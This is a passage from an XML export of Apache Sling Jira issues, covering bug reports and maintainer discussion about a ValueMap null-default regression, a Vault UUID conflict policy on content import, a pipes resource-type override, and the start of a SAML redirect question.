                            <comment id="17602221" author="sseifert@pro-vision.de" created="Fri, 9 Sep 2022 09:09:31 +0000"  >&lt;p&gt;fix in sling engine: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/2c2f426419169f8240e06988d09edd6a41c87e95&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/2c2f426419169f8240e06988d09edd6a41c87e95&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;launchpad testing services: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-launchpad-test-services/commit/0455b2865ddf07a678b0fa51ff0a736ec3e892ef&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-launchpad-test-services/commit/0455b2865ddf07a678b0fa51ff0a736ec3e892ef&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;i will wait with merging the &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-launchpad-integration-tests/pull/9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;launchtest integration tests&lt;/a&gt; until this sling engine bundle is released and updated in the sling starter.&lt;/p&gt;</comment>
                            <comment id="17603182" author="sseifert@pro-vision.de" created="Mon, 12 Sep 2022 16:37:44 +0000"  >&lt;p&gt;test cases: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-launchpad-integration-tests/commit/e9bd723ebd623006123c178f4adcead2f207c20d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-launchpad-integration-tests/commit/e9bd723ebd623006123c178f4adcead2f207c20d&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 6 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18en4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11567] ValueMap.get() with null defaultValue not working</title>
                <link>https://issues.apache.org/jira/browse/SLING-11567</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;While checking the current state of the JCR Bundle resource bundle against an existing codebase, I found that it throws errors like this:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;Caused by: java.lang.NullPointerException: null
        at org.apache.sling.jcr.resource.internal.JcrValueMap.get(JcrValueMap.java:110) [org.apache.sling.jcr.resource:3.2.1.SNAPSHOT]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is caused by calling &lt;tt&gt;ValueMap.get(propertyName, null)&lt;/tt&gt;. This was working with the version 3.2.0 of the jcr resource bundle.&lt;/p&gt;

&lt;p&gt;The &lt;tt&gt;defaultValue&lt;/tt&gt; parameter is marked as NonNull, and the javadoc for the ValueMap.get() method states this:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Implementation hint: In the past it was allowed to call this with a 2nd parameter being null. Therefore all implementations should internally call Map.get(Object) when the 2nd parameter has value null.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;That means that some backward-incompatible change has been made by declaring this parameter non-null (in the API).&lt;/p&gt;

&lt;p&gt;For the implementation that despite this parameter being marked as non-null, all implementations still need to do explicit checks for null and handle them properly.&lt;/p&gt;





</description>
                <environment></environment>
        <key id="13480126">SLING-11567</key>
            <summary>ValueMap.get() with null defaultValue not working</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="joerghoh">Joerg Hoh</assignee>
                                    <reporter username="joerghoh">Joerg Hoh</reporter>
                        <labels>
                    </labels>
                <created>Mon, 5 Sep 2022 12:19:43 +0000</created>
                <updated>Wed, 28 Sep 2022 09:42:00 +0000</updated>
                            <resolved>Wed, 14 Sep 2022 12:29:11 +0000</resolved>
                                                    <fixVersion>JCR Resource 3.2.2</fixVersion>
                                    <component>JCR</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="10800">3h</timespent>
                                <comments>
                            <comment id="17600508" author="joerghoh" created="Mon, 5 Sep 2022 18:35:41 +0000"  >&lt;p&gt;PR for discussion: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/pull/36&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-resource/pull/36&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17604062" author="joerghoh" created="Wed, 14 Sep 2022 12:29:11 +0000"  >&lt;p&gt;merged&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 6 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18bjc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11560] Vault error when importing a node with the same name and UUID as a pre-existing non-sibling node</title>
                <link>https://issues.apache.org/jira/browse/SLING-11560</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The latest version of &lt;em&gt;org.apache.jackrabbit.vault&lt;/em&gt; (&lt;em&gt;3.6.1.T20220805092633-0b8a2641&lt;/em&gt;) is throwing an exception when trying to install a content package (via SCD), which has a node with the same name and UUID as an existing non-sibling node.&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;Caused by: javax.jcr.ReferentialIntegrityException: Node identifier Optional[df89c4d9-6d47-480a-af2d-1bffa49bc5d1] already taken by node /content/dam/test/SYEW0105.JPG
&#160; &#160; at org.apache.jackrabbit.vault.fs.impl.io.DocViewImporter.addNode(DocViewImporter.java:862) [org.apache.jackrabbit.vault:3.6.1.T20220805092633-0b8a2641]
&#160; &#160; at org.apache.jackrabbit.vault.fs.impl.io.DocViewImporter.startDocViewNode(DocViewImporter.java:405) [org.apache.jackrabbit.vault:3.6.1.T20220805092633-0b8a2641]
&#160; &#160; at org.apache.jackrabbit.vault.fs.impl.io.DocViewSAXHandler.startElement(DocViewSAXHandler.java:348) [org.apache.jackrabbit.vault:3.6.1.T20220805092633-0b8a2641]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Older Behaviour:&lt;/b&gt; In the older version of jackrabbit vault (3.4.6), an new UUID would be created for the new node:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;17.08.2022 17:37:00.739 *WARN* [qtp1778855870-1811] org.apache.jackrabbit.vault.fs.impl.io.DocViewSAXImporter Packaged node at /content/dam/hunting/SYEW0105.JPG is referenceable and collides with existing node at /content/dam/test/SYEW0105.JPG. Will create new UUID.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Current Behaviour:&lt;/b&gt; From the AEM author logs, it seems that the OSGi config having the &lt;em&gt;IdConflictPolicy.LEGACY&lt;/em&gt; is not being respected by SCD:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;24.08.2022 15:10:45.799 *WARN* [qtp1859723769-86] org.apache.jackrabbit.vault.fs.impl.io.DocViewImporter Node Collision: To-be imported node /content/dam/hunting/SYEW0105.JPG uses a node identifier Optional[df89c4d9-6d47-480a-af2d-1bffa49bc5d1] which is already taken by /content/dam/test/SYEW0105.JPG, trying to resolve conflict according to policy FAIL
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Expected Behaviour:&lt;/b&gt; SCD should take the &lt;em&gt;IdConflictPolicy&lt;/em&gt; into consideration when installing the content packages. So if &lt;em&gt;IdConflictPolicy.LEGACY&lt;/em&gt; is set, then a new UUID should be generated for the new node.&lt;/p&gt;
</description>
                <environment></environment>
        <key id="13478664">SLING-11560</key>
            <summary>Vault error when importing a node with the same name and UUID as a pre-existing non-sibling node</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="marett">Timothee Maret</assignee>
                                    <reporter username="manasmaji4">Manas Kumar Maji</reporter>
                        <labels>
                    </labels>
                <created>Thu, 25 Aug 2022 13:56:05 +0000</created>
                <updated>Mon, 10 Mar 2025 17:13:40 +0000</updated>
                            <resolved>Thu, 22 Sep 2022 09:36:01 +0000</resolved>
                                                    <fixVersion>Content Distribution Core 0.6.0</fixVersion>
                    <fixVersion>Content Distribution Core 0.4.6</fixVersion>
                    <fixVersion>Content Distribution Journal Core 0.2.0</fixVersion>
                                    <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>6</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="17400">4h 50m</timespent>
                                <comments>
                            <comment id="17585189" author="marett" created="Fri, 26 Aug 2022 07:18:35 +0000"  >&lt;p&gt;Thank you for reporting &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=manasmaji4&quot; class=&quot;user-hover&quot; rel=&quot;manasmaji4&quot;&gt;manasmaji4&lt;/a&gt;. I think we&apos;d need to allow configuring the IdConflictPolicy and set the default to LEGACY. That way we will ensure backward compatibility while allowing to test with the new default.&lt;/p&gt;

&lt;p&gt;This would need to be done in two bundles&lt;/p&gt;

&lt;p&gt;1. &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-journal/blob/264c4092451fe522d453c69e16ae74c0b4cec53f/src/main/java/org/apache/sling/distribution/journal/bookkeeper/ContentPackageExtractor.java#L116&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ContentPackageExtractor&lt;/a&gt;&lt;br/&gt;
2. &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/1511fb3844f8cb699262cb82e5b920095638587f/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/VltUtils.java#L231&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;VltUtils&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=manasmaji4&quot; class=&quot;user-hover&quot; rel=&quot;manasmaji4&quot;&gt;manasmaji4&lt;/a&gt; would like to contribute those changes ?&lt;/p&gt;</comment>
                            <comment id="17600087" author="kwin" created="Sun, 4 Sep 2022 17:47:08 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=marett&quot; class=&quot;user-hover&quot; rel=&quot;marett&quot;&gt;marett&lt;/a&gt; Can you check if the PR attached to &lt;a href=&quot;https://issues.apache.org/jira/browse/JCRVLT-650&quot; title=&quot;OSGi config for default id conflict policy not correctly applied&quot; class=&quot;issue-link&quot; data-issue-key=&quot;JCRVLT-650&quot;&gt;&lt;del&gt;JCRVLT-650&lt;/del&gt;&lt;/a&gt; fixes your issue?&lt;/p&gt;</comment>
                            <comment id="17600088" author="marett" created="Sun, 4 Sep 2022 18:20:34 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=manasmaji4&quot; class=&quot;user-hover&quot; rel=&quot;manasmaji4&quot;&gt;manasmaji4&lt;/a&gt; could you validate the fix as suggested by &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; ?&lt;/p&gt;</comment>
                            <comment id="17600214" author="JIRAUSER291263" created="Mon, 5 Sep 2022 06:09:17 +0000"  >&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=marett&quot; class=&quot;user-hover&quot; rel=&quot;marett&quot;&gt;marett&lt;/a&gt;, I will verify the fix.&lt;/p&gt;</comment>
                            <comment id="17601216" author="JIRAUSER284589" created="Wed, 7 Sep 2022 09:41:06 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=manasmaji4&quot; class=&quot;user-hover&quot; rel=&quot;manasmaji4&quot;&gt;manasmaji4&lt;/a&gt; did you have the chance to validate the fix?&lt;/p&gt;</comment>
                            <comment id="17601398" author="reschke" created="Wed, 7 Sep 2022 16:42:31 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=manasmaji4&quot; class=&quot;user-hover&quot; rel=&quot;manasmaji4&quot;&gt;manasmaji4&lt;/a&gt; - could you please not only validate the fix but also review &lt;a href=&quot;https://github.com/apache/jackrabbit-filevault/pull/244&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/jackrabbit-filevault/pull/244&lt;/a&gt; ?&lt;/p&gt;</comment>
                            <comment id="17601747" author="marett" created="Thu, 8 Sep 2022 10:13:37 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; Sling Content Distribution &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/blob/b8acb3a1f6dec7b34431778d4097f1ddf2a0a177/src/main/java/org/apache/sling/distribution/serialization/impl/vlt/FileVaultContentSerializer.java#L129-L179&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;imports content using the ZipStreamArchive&lt;/a&gt;. Is it using the PackagingImpl under the hood ? If not, we may still need to set the IdConflictPolicy mode as suggested in this ticket because the PackagingImpl configuration won&apos;t be honoured.&lt;/p&gt;</comment>
                            <comment id="17601759" author="kwin" created="Thu, 8 Sep 2022 10:55:52 +0000"  >&lt;p&gt;You are using the low-level API Importer. Just make sure you pass the OSGi configuration from Packaging to the constructor of Importer. &lt;/p&gt;</comment>
                            <comment id="17605332" author="marett" created="Thu, 15 Sep 2022 13:08:09 +0000"  >&lt;p&gt;Makes sense to reuse the existing configuration.&lt;/p&gt;</comment>
                            <comment id="17606574" author="JIRAUSER291263" created="Mon, 19 Sep 2022 12:15:59 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/66&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR&lt;/a&gt; raised for review.&lt;/p&gt;

&lt;p&gt;Changes : Set the &lt;em&gt;idConflictPolicy&lt;/em&gt; &amp;amp; &lt;em&gt;overwritePrimaryTypesOfFoldersByDefault&lt;/em&gt; in the &lt;em&gt;ImportOptions&lt;/em&gt; so that the &lt;em&gt;Importer&lt;/em&gt; applies the conflict policy while installing content packages.&lt;/p&gt;

&lt;p&gt;cc. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=tmaret&quot; class=&quot;user-hover&quot; rel=&quot;tmaret&quot;&gt;tmaret&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17607688" author="marett" created="Wed, 21 Sep 2022 11:13:54 +0000"  >&lt;p&gt;PR for journal module &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-journal/pull/111&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-journal/pull/111&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17608173" author="marett" created="Thu, 22 Sep 2022 09:35:36 +0000"  >&lt;p&gt;Thank you &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=manasmaji4&quot; class=&quot;user-hover&quot; rel=&quot;manasmaji4&quot;&gt;manasmaji4&lt;/a&gt; . Squashed and merged &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/66&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/66&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13480031">JCRVLT-650</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z182m0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11559] writing relative properties may override resource type of the root</title>
                <link>https://issues.apache.org/jira/browse/SLING-11559</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>{write foo=blah foo/bar=blah}
&lt;p&gt; might override current resource resourceType with sling:Folder&lt;/p&gt;</description>
                <environment></environment>
        <key id="13478623">SLING-11559</key>
            <summary>writing relative properties may override resource type of the root</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="npeltier">Nicolas Peltier</reporter>
                        <labels>
                    </labels>
                <created>Thu, 25 Aug 2022 09:59:31 +0000</created>
                <updated>Thu, 25 Aug 2022 09:59:31 +0000</updated>
                                            <version>pipes 4.5.0</version>
                                                    <component>pipes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 8 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z182cw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11547] AuthenticationInfoPostProcess redirect failing</title>
                <link>https://issues.apache.org/jira/browse/SLING-11547</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;I am working with AEM 6.5, backed by Sling for SAML authentication and am having issues with the postProcess method that is invoked after a user is authenticated. I am attempting to do a redirect, but for some reason that is not working, here is what i have in my postProcessor&lt;/p&gt;

&lt;p&gt;httpServletResponse.setStatus(HttpServletResponse.&lt;font color=&quot;#9876aa&quot;&gt;SC_TEMPORARY_REDIRECT&lt;/font&gt;)&lt;font color=&quot;#cc7832&quot;&gt;;&lt;/font&gt;&lt;/p&gt;

